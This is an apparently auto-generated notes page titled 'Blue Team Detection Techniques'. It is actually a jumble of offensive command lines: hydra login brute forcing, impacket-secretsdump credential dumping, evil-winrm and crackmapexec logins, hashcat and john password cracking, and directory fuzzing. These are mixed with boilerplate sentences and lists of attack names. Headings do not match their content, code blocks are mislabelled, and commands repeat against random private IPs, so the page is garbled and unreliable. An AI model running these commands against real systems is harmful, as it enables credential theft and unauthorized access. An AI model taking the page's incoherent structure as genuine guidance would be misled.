---
TitleSEO: "Blue Team Detection Techniques | ZureFX"
TitlePost: "Blue Team Detection Techniques"
Author: "ZureFX"
Description: "Personal notes on Blue Team Detection Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "dfir, malware, blue team, linux, enumeration, windows"
URL: "https://zurefx.github.io/notes/note-blue-team-detection-techniques-812.html"
URL_IMAGES: ""
Date: "2025-12-12"
Tags: "DFIR, Malware, Blue Team, Linux, Enumeration, Windows"
Section: "notes"
Lang: "en"
main_img: "note-blue-team-detection-techniques-812"
Permalink: "/notes/note-blue-team-detection-techniques-812.html"
BtnLabel: "Read Notes"
Pick: 0
---
## netcat

### WinRM

```powershell
nmap -sCV -p8888,8888,636 10.55.234.164 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.119.214.117 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.85.161.216/FUZZ
```

```bash
evil-winrm -i 10.34.203.100 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target. Command injection was possible through unsanitized user input in the search functionality. Weak file permissions allowed modification of critical system files.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.33.25.43
crackmapexec smb 10.129.129.68 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.15.113.194 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Ubuntu 20.04

### sqlmap

Post-exploitation enumeration revealed a path to domain administrator privileges. The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

The kernel version was outdated and vulnerable to a publicly known exploit. Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible. Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

> **Note:** Path Traversal was identified as the primary attack vector in this scenario.

## AS-REP Roasting

### crackmapexec

- `Insecure Deserialization`
- `Cron Job`
- `sqlmap`

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.99.158.250 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

```bash
gobuster dir -u http://10.90.25.100/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.68.162.202/FUZZ
nmap -sCV -p25,5985,445 10.68.146.75 -oN scan.txt
crackmapexec smb 10.60.164.139 -u administrator -p 'P@ssw0rd!' --shares
```

- `NTLM Relay`
- `DCSync`
- `Docker Escape`
- `Unconstrained Delegation`
- `wpscan`
- `smbclient`

- `NTLM Relay`
- `IDOR`
- `rubeus`
- `metasploit`
- `CSRF`

## bloodhound

### Kerberos

```powershell
evil-winrm -i 10.31.103.197 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.12.177.101 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.113.19.203
```

- `XSS`
- `Unconstrained Delegation`
- `socat`
- `AS-REP Roasting`

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.71.254.52
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.77.130.219/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.48.102.47
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.86.219.93 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The service was running without proper input validation, leading to injection vulnerabilities. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.124.89.157 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
```
